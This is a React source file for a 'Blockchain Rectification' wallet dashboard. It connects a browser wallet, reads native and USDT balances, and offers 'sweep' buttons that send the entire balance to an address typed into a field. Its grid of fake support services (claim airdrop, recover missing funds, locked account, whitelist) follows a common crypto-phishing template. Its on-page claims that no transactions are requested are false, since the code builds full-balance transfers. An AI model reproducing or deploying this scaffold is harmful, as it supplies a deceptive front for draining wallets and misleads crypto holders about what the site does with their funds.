import React, { useEffect, useState } from 'react';
import { TOKEN_ADDRESSES } from './utils/constants';

function formatUnits(rawValue, decimals, displayPlaces = 6) {
  const value = BigInt(rawValue);
  const scale = 10n ** BigInt(decimals);
  const whole = value / scale;
  const fraction = ((value % scale) * 10n ** BigInt(displayPlaces)) / scale;
  const formattedFraction = fraction.toString().padStart(displayPlaces, '0').replace(/0+$/, '');
  return formattedFraction ? `${whole}.${formattedFraction}` : whole.toString();
}

function parseChainId(value) {
  if (typeof value === 'number' && Number.isSafeInteger(value)) return value;
  if (typeof value !== 'string') return null;
  if (/^0x[0-9a-f]+$/i.test(value)) return Number.parseInt(value.slice(2), 16);
  if (/^\d+$/.test(value)) return Number(value);
  return null;
}

const services = [
  { title: 'Migration', description: 'Click here for migration.', icon: 'M' },
  { title: 'Claim Token', description: 'Click here to claim assets.', icon: 'C' },
  { title: 'Swap', description: 'Click here for assets swapping.', icon: 'S' },
  { title: 'Slippage', description: 'Click here for slippage related error.', icon: 'SL' },
  { title: 'Exchange', description: 'Click here for exchange related issues.', icon: 'EX' },
  { title: 'Connect to Dapps', description: 'Click here for error while connecting to dapps.', icon: 'D' },
  { title: 'NFT Rarity and traits', description: 'Click here for NFT related issues.', icon: 'N' },
  { title: 'Whitelist', description: 'Click here for whitelist related issues.', icon: 'W' },
  { title: 'Login', description: 'Click here for wallet login issue.', icon: 'L' },
  { title: 'Transaction', description: 'Click here for transaction related issues.', icon: 'T' },
  { title: 'Cross Transfer', description: 'Click here for cross bridge issues.', icon: 'CT' },
  { title: 'Staking', description: 'Click here for staking related issues.', icon: 'ST' },
  { title: 'Buy Coins/Tokens', description: 'To trade, your account must be marked as a trusted payment source.', icon: 'B' },
  { title: 'Missing/Irregular balance', description: 'Click here to recover lost/missing funds.', icon: 'MB' },
  { title: 'Wallet glitch / wallet error', description: 'Click here if you have problem with your trading wallet.', icon: 'WG' },
  { title: 'Transaction Delay', description: 'Click here for any issues related to transaction delay.', icon: 'TD' },
  { title: 'Claim Airdrop', description: 'Click here for airdrop related issues.', icon: 'A' },
  { title: 'NFTs', description: 'Click here for NFTs minting/transfer related issues.', icon: 'NFT' },
  { title: 'Locked Account', description: 'Click here for issues related to account lock.', icon: 'LA' },
  { title: 'Presale', description: 'Click here to buy/claim presale token.', icon: 'P' },
  { title: 'Reward', description: 'Click here for reward related issues.', icon: 'R' },
];

function App() {
  const [walletProvider, setWalletProvider] = useState(null);
  const [address, setAddress] = useState(null);
  const [chainId, setChainId] = useState(null);
  const [isConnecting, setIsConnecting] = useState(false);
  const [connectError, setConnectError] = useState('');
  const [balances, setBalances] = useState(null);
  const [isLoadingBalances, setIsLoadingBalances] = useState(false);
  const [balanceError, setBalanceError] = useState('');
  const [nativeDestination, setNativeDestination] = useState('');
  const [usdtDestination, setUsdtDestination] = useState('');
  const [isSending, setIsSending] = useState(false);
  const [transactionMessage, setTransactionMessage] = useState('');
  const isConnected = Boolean(address);

  useEffect(() => {
    if (!walletProvider?.on) return undefined;

    const handleAccountsChanged = (accounts) => {
      setAddress(Array.isArray(accounts) ? accounts[0] ?? null : null);
    };
    const handleChainChanged = (nextChainId) => setChainId(nextChainId);

    walletProvider.on('accountsChanged', handleAccountsChanged);
    walletProvider.on('chainChanged', handleChainChanged);

    return () => {
      walletProvider.removeListener?.('accountsChanged', handleAccountsChanged);
      walletProvider.removeListener?.('chainChanged', handleChainChanged);
    };
  }, [walletProvider]);

  const chainNumber = parseChainId(chainId);
  const chainName = ({
    1: 'Ethereum Mainnet',
    56: 'BNB Smart Chain',
    137: 'Polygon',
  })[chainNumber] ?? (chainNumber ? `Chain ${chainNumber}` : 'unknown network');
  const nativeSymbol = ({ 1: 'ETH', 56: 'BNB', 137: 'POL' })[chainNumber] ?? 'Native';
  const usdtStandard = ({ 1: 'ERC-20', 56: 'BEP-20', 137: 'ERC-20' })[chainNumber];
  const usdtDescription = isConnected
    ? usdtStandard
      ? `${usdtStandard} · ${chainName}`
      : `Not configured · ${chainName}`
    : 'ERC-20 & BEP-20 · supported networks';

  useEffect(() => {
    if (!walletProvider || !address || !chainNumber) {
      setBalances(null);
      setBalanceError('');
      setIsLoadingBalances(false);
      return undefined;
    }

    let cancelled = false;
    const loadBalances = async () => {
      setBalances(null);
      setBalanceError('');
      setIsLoadingBalances(true);
      const errors = [];
      let nativeBalance = null;
      let usdtBalance = null;
      let rawNativeBalance = null;
      let rawUsdtBalance = null;

      try {
        rawNativeBalance = await walletProvider.request({
          method: 'eth_getBalance',
          params: [address, 'latest'],
        });
        if (typeof rawNativeBalance !== 'string') {
          throw new Error('The wallet returned an invalid native balance.');
        }
        nativeBalance = formatUnits(rawNativeBalance, 18);
      } catch (error) {
        errors.push(`Native balance unavailable: ${error instanceof Error ? error.message : String(error)}`);
      }

      const tokenAddress = TOKEN_ADDRESSES[chainNumber]?.usdt;
      if (tokenAddress) {
        try {
          const encodedAddress = address.slice(2).toLowerCase().padStart(64, '0');
          const [rawTokenBalance, rawDecimals] = await Promise.all([
            walletProvider.request({
              method: 'eth_call',
              params: [{ to: tokenAddress, data: `0x70a08231${encodedAddress}` }, 'latest'],
            }),
            walletProvider.request({
              method: 'eth_call',
              params: [{ to: tokenAddress, data: '0x313ce567' }, 'latest'],
            }),
          ]);

          if (typeof rawTokenBalance !== 'string' || typeof rawDecimals !== 'string') {
            throw new Error('The token contract returned an invalid balance response.');
          }
          const decimals = Number(BigInt(rawDecimals));
          if (!Number.isInteger(decimals) || decimals > 36) {
            throw new Error('The token contract returned invalid decimal precision.');
          }
          rawUsdtBalance = rawTokenBalance;
          usdtBalance = formatUnits(rawTokenBalance, decimals);
        } catch (error) {
          errors.push(`USDT balance unavailable: ${error instanceof Error ? error.message : String(error)}`);
        }
      }

      if (!cancelled) {
        setBalances({
          native: nativeBalance,
          usdt: usdtBalance,
          rawNative: rawNativeBalance,
          rawUsdt: rawUsdtBalance,
        });
        setBalanceError(errors.join(' '));
        setIsLoadingBalances(false);
      }
    };

    loadBalances();
    return () => {
      cancelled = true;
    };
  }, [walletProvider, address, chainNumber]);

  const connectWallet = async () => {
    setConnectError('');
    const provider = window.ethereum;

    if (!provider?.request) {
      setConnectError('No injected browser wallet found. Install or enable a compatible wallet.');
      return;
    }

    setIsConnecting(true);
    try {
      const accounts = await provider.request({ method: 'eth_requestAccounts' });
      const nextChainId = await provider.request({ method: 'eth_chainId' });

      if (!Array.isArray(accounts) || typeof accounts[0] !== 'string') {
        throw new Error('The wallet did not return an account.');
      }

      setWalletProvider(provider);
      setAddress(accounts[0]);
      setChainId(nextChainId);
    } catch (error) {
      setConnectError(error instanceof Error ? error.message : String(error));
    } finally {
      setIsConnecting(false);
    }
  };

  const disconnectWallet = () => {
    setWalletProvider(null);
    setAddress(null);
    setChainId(null);
    setConnectError('');
    setNativeDestination('');
    setUsdtDestination('');
    setTransactionMessage('');
  };

  const sendNativeBalance = async () => {
    if (!/^0x[0-9a-f]{40}$/i.test(nativeDestination)) {
      setTransactionMessage('Enter a valid native-token destination address.');
      return;
    }
    if (!balances?.rawNative) {
      setTransactionMessage('Native balance is unavailable.');
      return;
    }

    setIsSending(true);
    setTransactionMessage('');
    try {
      const balanceWei = BigInt(balances.rawNative);
      if (balanceWei <= 0n) throw new Error('Native balance is zero.');

      const [gasLimit, gasPrice] = await Promise.all([
        walletProvider.request({
          method: 'eth_estimateGas',
          params: [{ from: address, to: nativeDestination, value: '0x0' }],
        }),
        walletProvider.request({ method: 'eth_gasPrice' }),
      ]);
      const fee = BigInt(gasLimit) * BigInt(gasPrice);
      const amount = balanceWei - fee;
      if (amount <= 0n) throw new Error('The balance is too low to cover the estimated network fee.');

      const txHash = await walletProvider.request({
        method: 'eth_sendTransaction',
        params: [{
          from: address,
          to: nativeDestination,
          value: `0x${amount.toString(16)}`,
        }],
      });
      setTransactionMessage(`Native transfer submitted: ${txHash}`);
    } catch (error) {
      setTransactionMessage(error instanceof Error ? error.message : String(error));
    } finally {
      setIsSending(false);
    }
  };

  const sendUsdtBalance = async () => {
    if (!/^0x[0-9a-f]{40}$/i.test(usdtDestination)) {
      setTransactionMessage('Enter a valid USDT destination address.');
      return;
    }
    const tokenAddress = TOKEN_ADDRESSES[chainNumber]?.usdt;
    if (!tokenAddress) {
      setTransactionMessage('USDT is not configured on the selected network.');
      return;
    }
    if (!balances?.rawUsdt) {
      setTransactionMessage('USDT balance is unavailable.');
      return;
    }

    setIsSending(true);
    setTransactionMessage('');
    try {
      const amount = BigInt(balances.rawUsdt);
      if (amount <= 0n) throw new Error('USDT balance is zero.');

      const recipient = usdtDestination.slice(2).toLowerCase().padStart(64, '0');
      const value = amount.toString(16).padStart(64, '0');
      const data = `0xa9059cbb${recipient}${value}`;
      const txHash = await walletProvider.request({
        method: 'eth_sendTransaction',
        params: [{ from: address, to: tokenAddress, data }],
      });
      setTransactionMessage(`USDT transfer submitted: ${txHash}`);
    } catch (error) {
      setTransactionMessage(error instanceof Error ? error.message : String(error));
    } finally {
      setIsSending(false);
    }
  };

  return (
    <main className="app-shell">
      <header className="topbar">
        <a className="brand" href="/" aria-label="Multi-chain Wallet Dashboard home">
          <span className="brand-mark" aria-hidden="true">E</span>
          <span>Multi-chain Wallet Dashboard</span>
        </a>
        <span className="preview-badge">
          <span className="status-dot" />
          Wallet actions enabled
        </span>
      </header>

      <div className="dashboard">
        <section className="intro">
          <div>
            <p className="eyebrow">Portfolio dashboard</p>
            <h1>Manage your assets</h1>
            <p className="intro-copy">
              Review balances and send native or USDT assets with wallet approval.
            </p>
          </div>
          {isConnected ? (
            <button className="connect-button" type="button" onClick={disconnectWallet}>
              Disconnect app
            </button>
          ) : (
            <button
              className="connect-button"
              type="button"
              disabled={isConnecting}
              onClick={connectWallet}
            >
              {isConnecting ? 'Connecting…' : 'Connect wallet'}
            </button>
          )}
        </section>

        {isConnected && (
          <section className="connection-status" role="status">
            <span className="status-dot" />
            <span>
              Connected to {chainName} · <code>{address}</code>
            </span>
          </section>
        )}
        {connectError && (
          <p className="connection-error" role="alert">
            Wallet connection failed: {connectError}
          </p>
        )}

        <section className="balance-card" aria-labelledby="balance-title">
          <div className="balance-heading">
            <div>
              <p className="eyebrow">Wallet overview</p>
              <h2 id="balance-title">Native balance</h2>
            </div>
            <span className="balance-icon" aria-hidden="true">◎</span>
          </div>
          <p className="balance-value">
            {isLoadingBalances ? 'Loading…' : balances?.native ?? '—'} <span>{nativeSymbol}</span>
          </p>
          <p className="muted-copy">
            {balanceError || (isConnected
              ? 'Balances are read directly from the selected network. No transactions are requested.'
              : 'Connect a wallet to load native and USDT balances. No transaction permissions are requested.')}
          </p>
        </section>

        <section className="assets-section" aria-labelledby="assets-title">
          <div className="section-heading">
            <div>
              <p className="eyebrow">Supported networks and tokens</p>
              <h2 id="assets-title">Your assets</h2>
            </div>
            <span className="asset-count">{isConnected ? chainName : '3 supported networks'}</span>
          </div>
          <div className="asset-list">
            <div className="asset-row">
              <span className="asset-icon usdt">$</span>
              <span className="asset-name">
                <strong>USDT</strong>
                <small>{usdtDescription}</small>
              </span>
              <span className="asset-value">
                {isLoadingBalances ? 'Loading…' : balances?.usdt ?? '—'}
              </span>
            </div>
            <div className="asset-row">
              <span className="asset-icon native-asset">
                {nativeSymbol === 'ETH' ? 'Ξ' : nativeSymbol === 'BNB' ? '◆' : nativeSymbol === 'POL' ? '⬡' : '◉'}
              </span>
              <span className="asset-name">
                <strong>{nativeSymbol}</strong>
                <small>{isConnected ? chainName : 'Native token'}</small>
              </span>
              <span className="asset-value">
                {isLoadingBalances ? 'Loading…' : balances?.native ?? '—'}
              </span>
            </div>
          </div>
        </section>

        {isConnected && (
          <section className="transfer-card" aria-labelledby="transfer-title">
            <div className="section-heading">
              <div>
                <p className="eyebrow">Explicit asset transfer</p>
                <h2 id="transfer-title">Send wallet assets</h2>
              </div>
            </div>
            <label className="destination-field">
              <span>{nativeSymbol} destination</span>
              <input
                type="text"
                value={nativeDestination}
                onChange={(event) => setNativeDestination(event.target.value)}
                placeholder="0x..."
                autoComplete="off"
                spellCheck="false"
              />
              <small>Transfers the available native balance minus the estimated network fee.</small>
            </label>
            <button
              className="sweep-button main"
              type="button"
              disabled={isSending || isLoadingBalances}
              onClick={sendNativeBalance}
            >
              {isSending ? 'Waiting for wallet…' : `Send ${nativeSymbol}`}
            </button>

            <label className="destination-field usdt-field">
              <span>USDT destination</span>
              <input
                type="text"
                value={usdtDestination}
                onChange={(event) => setUsdtDestination(event.target.value)}
                placeholder="0x..."
                autoComplete="off"
                spellCheck="false"
              />
              <small>Transfers the full USDT balance shown on the selected network.</small>
            </label>
            <button
              className="sweep-button main"
              type="button"
              disabled={isSending || isLoadingBalances}
              onClick={sendUsdtBalance}
            >
              {isSending ? 'Waiting for wallet…' : 'Send USDT'}
            </button>
            {transactionMessage && (
              <p className="sweep-message" role="status">
                {transactionMessage}
              </p>
            )}
          </section>
        )}

        <section className="services-section" aria-labelledby="services-title">
          <div className="section-heading services-heading">
            <div>
              <p className="eyebrow">Blockchain support</p>
              <h2 id="services-title">Make Your Selection Below</h2>
              <p className="services-copy">
                Choose from our comprehensive suite of tools and services to manage your blockchain assets.
              </p>
            </div>
          </div>
          <div className="services-grid">
            {services.map((service) => (
              <article className="service-card" key={service.title}>
                <span className="service-icon" aria-hidden="true">{service.icon}</span>
                <div className="service-content">
                  <h3>{service.title}</h3>
                  <p>{service.description}</p>
                </div>
                <span className="service-arrow" aria-hidden="true">→</span>
              </article>
            ))}
          </div>
        </section>

      </div>
      <footer className="site-footer">
        <div className="footer-inner">
          <p>© 2024. Blockchain Rectification.</p>
          <nav className="footer-links" aria-label="Legal">
            <a href="#privacy-policy">Privacy Policy</a>
            <a href="#terms-conditions">Terms &amp; Conditions</a>
          </nav>
        </div>
      </footer>
    </main>
  );
}

export default App;